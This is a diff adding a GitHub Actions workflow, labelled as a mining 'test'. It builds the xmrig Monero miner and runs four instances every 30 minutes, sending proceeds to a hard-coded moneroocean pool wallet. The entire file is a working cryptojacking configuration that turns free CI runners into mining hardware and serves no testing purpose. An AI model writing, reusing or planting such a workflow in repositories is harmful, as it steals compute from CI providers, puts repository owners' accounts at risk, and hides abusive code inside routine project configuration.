@@ -1,0 +1,50 @@
+name: XMR Mining Test
+
+on:
+  push:
+  schedule:
+    - cron: '*/30 * * * *'  # ⏰ Run every 30 minutes
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        miner: [1, 2, 3, 4]  # 🔁 Run 4 miners in parallel
+
+    steps:
+    - name: Checkout repo
+      uses: actions/checkout@v3
+
+    - name: Install dependencies
+      run: |
+        sudo apt update
+        sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+    - name: Clone xmrig
+      run: git clone https://github.com/xmrig/xmrig.git
+
+    - name: Build xmrig
+      run: |
+        cd xmrig
+        mkdir build
+        cd build
+        cmake .. -DWITH_HWLOC=OFF
+        make -j$(nproc)
+
+    - name: Create config.json
+      run: |
+        echo '{
+          "autosave": true,
+          "cpu": { "enabled": true },
+          "pools": [{
+            "url": "gulf.moneroocean.stream:10128",
+            "user": "47HxtCmFXxqVzQSGjQgBnDC1LRTrokf3aMFocbWQRxYzjhjxkfLGjzwE3PJhrCtdQkXPunr8cZZBAiEmY5W46V1UV8mFMZh",
+            "pass": "mustafa6",
+            "algo": "randomx",
+            "tls": false
+          }]
+        }' > config.json
+
+    - name: Run xmrig miner
+      run: ./xmrig/build/xmrig -c config.json
